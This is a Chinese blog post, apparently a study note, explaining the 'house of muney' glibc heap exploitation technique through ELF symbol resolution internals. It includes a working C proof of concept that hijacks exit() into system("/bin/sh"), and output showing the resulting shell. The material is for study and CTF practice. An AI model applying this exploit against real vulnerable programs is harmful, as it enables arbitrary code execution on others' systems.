# GlibcHeap-house of muney


> `house of muney`的学习笔记。

<!--more-->

## 前言

遇到了好几次`hosue of muney`相关的题目，之前并没有深入地分析`house of muney`的原理，只是了解了一个大概。这次详细分析一下原理与相关源码，并尝试挖掘出一些新的东西出来。<br />本次调试基于`ubuntu 20.04  2.31-0ubuntu9.9`，自己写的`poc`，会与原有的`poc`相比有改动。

<!--more-->

## 利用原理
要理解`house of muney`的利用，就必须清楚`elf`文件的动态链接过程。从《链接、装载与库》这本书里面就对`ELF`文件有着深入的剖析。这里不详细的说明`elf`文件的组成格式与装载流程，只会涉及到符号解析的部分。
<a name="jMcY1"></a>

### ELF文件解析
众所周知，解析`ELF`文件只需要解析好文件头即可。`ELF`文件头定义好了静态视图下的`ELF`文件和动态视图下的`ELF`文件。首先简要说一下静态视图。<br />静态视图下，组成`elf`文件的基本单位是`section`，可以翻译为节。`elf`头会定义节头表（这里插播一句，所谓的表，其实都是数组，数组的每个元素都是一个结构体，比如`dyn/rel`等），节头表中定义了节的数量、每个节的类型、起始的虚拟地址。与动态链接相关的节为`.dynamic`节，这里面存储这与动态链接相关的描述信息。使用`readelf`查看`.dynamic`，这里以`pwncli/examples`文件夹下的`stackoverflow_pie`文件为例。
```bash
$ readelf -d stackoverflow_pie

Dynamic section at offset 0xdf8 contains 26 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x610
 0x000000000000000d (FINI)               0x8d4
 0x0000000000000019 (INIT_ARRAY)         0x200de8
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x200df0
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x298
 0x0000000000000005 (STRTAB)             0x3e0
 0x0000000000000006 (SYMTAB)             0x2c0
 0x000000000000000a (STRSZ)              163 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x201000
 0x0000000000000002 (PLTRELSZ)           120 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x598
 0x0000000000000007 (RELA)               0x4c0
 0x0000000000000008 (RELASZ)             216 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffb (FLAGS_1)            Flags: PIE
 0x000000006ffffffe (VERNEED)            0x4a0
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x484
 0x000000006ffffff9 (RELACOUNT)          3
 0x0000000000000000 (NULL)               0x0
```
这里的`.dynamic`实际是一个数组，数组的每一个元素对应的数据结构为：
```c
typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;
```
这里的`tag`表示的是节的类型，也就是上面使用`readelf`打印出来的，在小括号中表示的如：`INIT`,`FINI`和`STRTAB`等等。第二个成员是一个联合体，有时候表示的是这个节处在节表中的下标，而有时候则表示这个节的虚拟地址。与符号查找相关的就是这里的`STRTAB`和`SYMTAB`。

这两个表分别是字符串表 和符号表，字符串表就是一大串字符串，包含整个程序中所使用到的所有字符。符号表则表示符号的定义，其对应的数据结构为：
```c
typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;
```
这里需要注意，第一个成员的大小为`4`字节，表示的意思是这个符号所描述的字符串在字符串表中的下标。那么，如果修改了这个下标，就能解析出不同的符号地址。还有一个需要关注的成员是`st_value`，表示符号的值。而当符号是一个函数或者变量的时候，这个值就代表符号的虚拟地址，如果开启了`PIE`，那么符号的实际地址就是加载的基地址加上这个值。

符号表和字符串表描述了怎么找到符号，但是如何标识哪些符号需要重定位，则需要使用到重定位表。使用 `readelf`查看重定位表。
```bash
$ readelf -r ./stackoverflow_pie

Relocation section '.rela.dyn' at offset 0x4c0 contains 9 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000200de8  000000000008 R_X86_64_RELATIVE                    7a0
000000200df0  000000000008 R_X86_64_RELATIVE                    760
000000201048  000000000008 R_X86_64_RELATIVE                    201048
000000200fd8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTMClone + 0
000000200fe0  000700000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
000000200fe8  000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000200ff0  000900000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCloneTa + 0
000000200ff8  000a00000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0
000000201050  000b00000005 R_X86_64_COPY     0000000000201050 stdout@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x598 contains 5 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000201018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000201020  000300000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0
000000201028  000400000007 R_X86_64_JUMP_SLO 0000000000000000 system@GLIBC_2.2.5 + 0
000000201030  000500000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000201038  000600000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
```
重定位表的数据结构为：
```c
typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
} Elf64_Rel;
```
对于可重定位文件来说，`r_offset`表示重定位入口所需要修正的位置的第一个字节的地址。换句话说，一般在查找动态符号的时候，这个值代表对应符号在`got`表中的地址。使用 `libc.got['xxx']`得到的就是这个地址。<br />第二个成员一般有两部分，低`32`位表示重定位入口的类型，高`32`位表示这个重定位符号在符号表中的下标。

接下来，再来看`plt`表和`got`表。<br />`plt`表的全称为`procedure linkage table`，程序调用其他`so`中定义的函数实际会跳转到对应的`plt`表进行调用。不管什么时候，`plt`一定会跳转到对应的`got`表中，取出`got`表的地址，然后跳转。如果程序使用的是懒加载机制，那么在第一次调用某个函数时，其`got`表对应的内容实际并不是该函数的真实地址，此时会走向解析符号的流程，解析成功后，将真实地址装载到`got`表中，以后的每一次调用，则都会直接跳转到真实地址。

有一种利用方法叫做`ret2plt/ret2got`就是利用这两个表的特性，修改`got`表，即可控制程序的执行流。那么，第一次调用函数时，其对应`got`表中填写的地址对应的指令是啥呢。
```bash
push n
push ModuleID
jmp _dl_runtime_resolve
```
实际上，第`2`条指令是第`3`条指令都处于`plt[0]`，因此，实际上每个`got`表中初始状态下填写的指令为：
```bash
push n
jmp plt[0]
```
而这里的`n`对应的是该符号在`rel.plt`重定位表中的下标。第二个`MoudleID`则一般是本程序的`link_map`结构体的地址，解析来就进入到了`_dl_runtime_resolve`函数 。

简单小结一下，在解析符号的时候，**简略**步骤可以这样理解：

1. 从`plt`表跳转到`got`表
2. `push n/push ModuleID`，然后跳转到`_dl_runtime_resolve`函数。
3. 上一步实际是找到符号的重定位表条目。在重定位表中，分别记录了解析好地址后需要回填的地址，即符号的`got`表地址，同时记录了符号所在的符号表的下标。
4. 根据符号表找到符号的字符串
5. 根据字符串去每个`so`中搜索
6. 找到对应`so`中的符号表，里面的`st_value`存储着符号的真正偏移。
7. 找到符号之后，计算出真实的偏移，然后填回到`got`表，避免下一次重新解析
8. 调用该函数

<a name="VtdKV"></a>
### 符号查找
符号查找过程中的第一个函数是`_dl_runtime_resolve`，其对应的汇编代码如下：
```bash
Dump of assembler code for function _dl_runtime_resolve_xsavec:
   0x00007ffff7fe7bc0 <+0>:	endbr64 
   0x00007ffff7fe7bc4 <+4>:	push   rbx
   0x00007ffff7fe7bc5 <+5>:	mov    rbx,rsp
   0x00007ffff7fe7bc8 <+8>:	and    rsp,0xffffffffffffffc0
   0x00007ffff7fe7bcc <+12>:	sub    rsp,QWORD PTR [rip+0x14b35]        # 0x7ffff7ffc708 <_rtld_global_ro+232>
   0x00007ffff7fe7bd3 <+19>:	mov    QWORD PTR [rsp],rax
   0x00007ffff7fe7bd7 <+23>:	mov    QWORD PTR [rsp+0x8],rcx
   0x00007ffff7fe7bdc <+28>:	mov    QWORD PTR [rsp+0x10],rdx
   0x00007ffff7fe7be1 <+33>:	mov    QWORD PTR [rsp+0x18],rsi
   0x00007ffff7fe7be6 <+38>:	mov    QWORD PTR [rsp+0x20],rdi
   0x00007ffff7fe7beb <+43>:	mov    QWORD PTR [rsp+0x28],r8
   0x00007ffff7fe7bf0 <+48>:	mov    QWORD PTR [rsp+0x30],r9
   0x00007ffff7fe7bf5 <+53>:	mov    eax,0xee
   0x00007ffff7fe7bfa <+58>:	xor    edx,edx
   0x00007ffff7fe7bfc <+60>:	mov    QWORD PTR [rsp+0x250],rdx
   0x00007ffff7fe7c04 <+68>:	mov    QWORD PTR [rsp+0x258],rdx
   0x00007ffff7fe7c0c <+76>:	mov    QWORD PTR [rsp+0x260],rdx
   0x00007ffff7fe7c14 <+84>:	mov    QWORD PTR [rsp+0x268],rdx
   0x00007ffff7fe7c1c <+92>:	mov    QWORD PTR [rsp+0x270],rdx
   0x00007ffff7fe7c24 <+100>:	mov    QWORD PTR [rsp+0x278],rdx
   0x00007ffff7fe7c2c <+108>:	xsavec [rsp+0x40]
   0x00007ffff7fe7c31 <+113>:	mov    rsi,QWORD PTR [rbx+0x10]
   0x00007ffff7fe7c35 <+117>:	mov    rdi,QWORD PTR [rbx+0x8]
=> 0x00007ffff7fe7c39 <+121>:	call   0x7ffff7fe00c0 <_dl_fixup>
   0x00007ffff7fe7c3e <+126>:	mov    r11,rax
   0x00007ffff7fe7c41 <+129>:	mov    eax,0xee
   0x00007ffff7fe7c46 <+134>:	xor    edx,edx
   0x00007ffff7fe7c48 <+136>:	xrstor [rsp+0x40]
   0x00007ffff7fe7c4d <+141>:	mov    r9,QWORD PTR [rsp+0x30]
   0x00007ffff7fe7c52 <+146>:	mov    r8,QWORD PTR [rsp+0x28]
   0x00007ffff7fe7c57 <+151>:	mov    rdi,QWORD PTR [rsp+0x20]
   0x00007ffff7fe7c5c <+156>:	mov    rsi,QWORD PTR [rsp+0x18]
   0x00007ffff7fe7c61 <+161>:	mov    rdx,QWORD PTR [rsp+0x10]
   0x00007ffff7fe7c66 <+166>:	mov    rcx,QWORD PTR [rsp+0x8]
   0x00007ffff7fe7c6b <+171>:	mov    rax,QWORD PTR [rsp]
   0x00007ffff7fe7c6f <+175>:	mov    rsp,rbx
   0x00007ffff7fe7c72 <+178>:	mov    rbx,QWORD PTR [rsp]
   0x00007ffff7fe7c76 <+182>:	add    rsp,0x18
   0x00007ffff7fe7c7a <+186>:	bnd jmp r11
End of assembler dump.
```
前面做了一系列工作保存数据，然后就是`call _dl_fixup`这个函数，然后获取到真实的地址，把地址保存在`r11`寄存器中，把相关数据恢复后，直接`jmp r11`。所以，重点需要看一下`_dl_fixup`这个函数。<br />为了方便，直接将函数的分析写成注释，如下所示：
```c
/* This function is called through a special trampoline from the PLT the
   first time each PLT entry is called.  We must perform the relocation
   specified in the PLT of the given shared object, and return the resolved
   function address to the trampoline, which will restart the original call
   to that address.  Future calls will bounce directly from the PLT to the
   function.  */

DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
	   struct link_map *l, ElfW(Word) reloc_arg)
{
  // 这里的l是二进制程序本身的link_map，而不是so的
  // 第二个参数即为push n，所查找的符号在重定位表.rel.plt中的索引

  // 首先根据link_map中记录的信息，找到动态链接相关的符号表和字符串表
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  // 找到对应的重定位元素、符号表、字符串
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  // rel_addr 即为got表的地址，在查找到符号真实地址之后会回填到这个地址中
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];
	  if (version->hash == 0)
	    version = NULL;
	}

      /* We need to keep the scope around so do some locking.  This is
	 not necessary for objects which cannot be unloaded or when
	 we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
	{
	  THREAD_GSCOPE_SET_FLAG ();
	  flags |= DL_LOOKUP_GSCOPE_LOCK;
	}

#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif
	// 第一个参数是字符串地址，根据符号表和字符串表得到的
	// 第二个参数是link_map
	// 第三个参数是符号表的地址，是一个栈地址，最后会修正得到的符号表
	// 第四个参数是scope，表示查找的范围
	// 第五个参数是版本信息
	// 后面的参数都是固定的
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
	THREAD_GSCOPE_RESET_FLAG ();

#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif

      /* Currently result contains the base load address (or link map)
	 of the object that defines sym.  Now add in the symbol
	 offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
				   SYMBOL_ADDRESS (result, sym, false));
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
	 address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
    }

  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);

  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;
	// 修正got表条目
  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```
很多细节并没有深入阐述，只给出了大致的流程。<br />接下来调用`_dl_lookup_symbol_x`在其他`link_map`中寻找符号，实际调用的是`do_lookup_x`，然后来看这个函数。
```c
* Inner part of the lookup functions.  We return a value > 0 if we
   found the symbol, the value 0 if nothing is found and < 0 if
   something bad happened.  */
static int
__attribute_noinline__
do_lookup_x (const char *undef_name, uint_fast32_t new_hash,
	     unsigned long int *old_hash, const ElfW(Sym) *ref,
	     struct sym_val *result, struct r_scope_elem *scope, size_t i,
	     const struct r_found_version *const version, int flags,
	     struct link_map *skip, int type_class, struct link_map *undef_map)
{
  size_t n = scope->r_nlist;
  /* Make sure we read the value before proceeding.  Otherwise we
     might use r_list pointing to the initial scope and r_nlist being
     the value after a resize.  That is the only path in dl-open.c not
     protected by GSCOPE.  A read barrier here might be to expensive.  */
  __asm volatile ("" : "+r" (n), "+m" (scope->r_list));
  struct link_map **list = scope->r_list;

  do
    {
      const struct link_map *map = list[i]->l_real;

      /* Here come the extra test needed for `_dl_lookup_symbol_skip'.  */
      if (map == skip)
	continue;

      /* Don't search the executable when resolving a copy reloc.  */
      if ((type_class & ELF_RTYPE_CLASS_COPY) && map->l_type == lt_executable)
	continue;

      /* Do not look into objects which are going to be removed.  */
      if (map->l_removed)
	continue;

      /* Print some debugging info if wanted.  */
      if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_SYMBOLS))
	_dl_debug_printf ("symbol=%s;  lookup in file=%s [%lu]\n",
			  undef_name, DSO_FILENAME (map->l_name),
			  map->l_ns);

      /* If the hash table is empty there is nothing to do here.  */
      if (map->l_nbuckets == 0)
	continue;

      Elf_Symndx symidx;
      int num_versions = 0;
      const ElfW(Sym) *versioned_sym = NULL;

      /* The tables for this map.  */
      // 找到符号表和字符串表（当前link_map）
      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);
      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);

      const ElfW(Sym) *sym;
      // 获取bitmask
      const ElfW(Addr) *bitmask = map->l_gnu_bitmask;
      if (__glibc_likely (bitmask != NULL))
	{
      // 获取bitmask_word，这里需要伪造
	  ElfW(Addr) bitmask_word
	    = bitmask[(new_hash / __ELF_NATIVE_CLASS)
		      & map->l_gnu_bitmask_idxbits];

	  unsigned int hashbit1 = new_hash & (__ELF_NATIVE_CLASS - 1);
	  unsigned int hashbit2 = ((new_hash >> map->l_gnu_shift)
				   & (__ELF_NATIVE_CLASS - 1));

	  if (__glibc_unlikely ((bitmask_word >> hashbit1)
				& (bitmask_word >> hashbit2) & 1))
	    {
          // 获取bucket，这里需要伪造
	      Elf32_Word bucket = map->l_gnu_buckets[new_hash
						     % map->l_nbuckets];
	      if (bucket != 0)
		{
          // hasharr，这里也需要伪造对应的值
		  const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];

		  do
		    if (((*hasharr ^ new_hash) >> 1) == 0)
		      {
			symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr);
			sym = check_match (undef_name, ref, version, flags,
					   type_class, &symtab[symidx], symidx,
					   strtab, map, &versioned_sym,
					   &num_versions);
			if (sym != NULL)
			  goto found_it;
		      }
		  while ((*hasharr++ & 1u) == 0);
		}
	    }
          //....
  }
```
如果找到了，就跳转到`found_it`分支，然后就会进行一些基本的检查之后，就会跳转出去，符号查找结束。<br />如果没找到，最后会`assert`抛出断言，程序异常终止。
<a name="Z8GpW"></a>

### 利用过程

`ptmalloc`堆分配器在分配超大内存`> 128K`的时候，会调用`mmap`申请系统内存，此时申请到的内存一般位于`libc.so.6`映射的内存地址的低地址处。`house of muney`的核心在于修改`mmap`内存的`size`大小，使其能把`libc.so.6`的符号表、哈希表等数据所在的地址空间也释放掉。然后再把这一片空间给申请回来，就能伪造符号表、哈希表，那么在解析函数实际地址的时候就能控制其解析为任意地址，进而控制程序执行流。

1. `A = mmap(addr=NULL, length=0x1000,...)`
2. 修改`A`的`size`，为`0x1000 + XXX`
3. `free(A)`，实际执行的是：`munmap(A, 0x1000 + XXX)`，就可以偷取`glibc`的内存
4. `mmap(addr=NULL, length=0x1000 + XXX, ... )`，然后输入数据，就可以控制"偷去"的内存的内容
5. 在进行符号解析的时候，进行任意函数调用

## POC
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

void main()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    char *strptr = mmap(0xdeadb000, 0x1000, 6, 0x22, -1, 0);
    strcpy(strptr, "/bin/sh");

    puts("[*] step1: allocate a chunk ---> void* ptr = malloc(0x40000);");
    size_t *ptr = (size_t *)malloc(0x40000);
    
    size_t sz = ptr[-1];
    printf("[*] ptr address: %p, chunk size: %p\n", ptr, (void *)sz);
    
    puts("[*] step2: change the size of the chunk ---> ptr[-1] += 0x5000;");
    ptr[-1] += 0x5000;
    
    puts("[*] step3: free ptr and steal heap from glibc ---> free(ptr);");
    free(ptr);

    puts("[*] step4: retrieve heap ---> ptr = malloc(0x41000 * 2);");
    ptr = malloc(0x41000 * 2);
    
    sz = ptr[-1];
    printf("[*] ptr address: %p, chunk size: %p\n", ptr, (void *)sz);

    // 当前ptr到原有libc基地址的偏移
    size_t base_off = 0x7dff0;
    // 以下地址均是相对于libc基地址的偏移
    size_t system_off = 0x52290;
    size_t bitmask_word_off = 0xb88;
    size_t bucket_off = 0xcb0;
    size_t exit_sym_st_value_off = 0x4d20;
    size_t hasharr_off = 0x1d7c;

    puts("[*] step5: set essential data for dl_runtime_resolve");

    *(size_t *)((char *)ptr + base_off + bitmask_word_off) = 0xf000028c0200130eul;
    puts("[*] set bitmask_word to 0xf000028c0200130eul");

    *(unsigned int *)((char *)ptr + base_off + bucket_off) = 0x86u;
    puts("[*] set bucket to 0x86u");

    *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off) = system_off;
    puts("[*] set exit@sym.st_value to system_off 0x52290");

    *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off - 8) = 0xf001200002efbul;
    puts("[*] set other exit@sym members");

    *(size_t *)((char *)ptr + base_off + hasharr_off) = 0x7c967e3e7c93f2a0ul;
    puts("[*] set hasharr to 0x7c967e3e7c93f2a0ul");

    puts("[*] step6: get shell ---> exit(\"/bin/sh\")");
    exit(strptr);
}
```

执行后输出：
```c
[*] step1: allocate a chunk ---> void* ptr = malloc(0x40000);
[*] ptr address: 0x7fada13f4010, chunk size: 0x41002
[*] step2: change the size of the chunk ---> ptr[-1] += 0x5000;
[*] step3: free ptr and steal heap from glibc ---> free(ptr);
[*] step4: retrieve heap ---> ptr = malloc(0x41000 * 2);
[*] ptr address: 0x7fada13b7010, chunk size: 0x83002
[*] step5: set essential data for dl_runtime_resolve
[*] set bitmask_word to 0xf000028c0200130eul
[*] set bucket to 0x86u
[*] set exit@sym.st_value to system_off 0x52290
[*] set other exit@sym members
[*] set hasharr to 0x7c967e3e7c93f2a0ul
[*] step6: get shell ---> exit("/bin/sh")
$ whoami
roderick
```
![image](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image.png)

总的来看，需要伪造的结构有：

1. bitmask_word
2. bucket
3. hasharr，需要多伪造几个，并不是第一个就满足条件
4. target symbol ->st_value，符号表中，除了st_value修改为目标地址外，其他成员建议保持不变
    <a name="YuzCI"></a>



## 思考

个人感觉`house of muney`可以进行拓展，只要可以在**偷到的内存**上面做一些文章，就可以达到一些特殊的目的。

比如说，还可以直接控制`text`段的内存空间，前提是需要保证后来`mmap`的内存是可执行的；还可以控制`ro_rtld_global`里面的数据，绕过一些校验，或者改变程序的执行流。这些拓展的利用手段可以后续进行探索。

## 参考

- [关于elf各个段的解释，很全面](https://www.cnblogs.com/kekec/p/13829510.html)
- [安全客上关于house of muney的分析](https://www.anquanke.com/post/id/254797#h3-1)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2022-06-18-glibcheap-house-of-muney/  

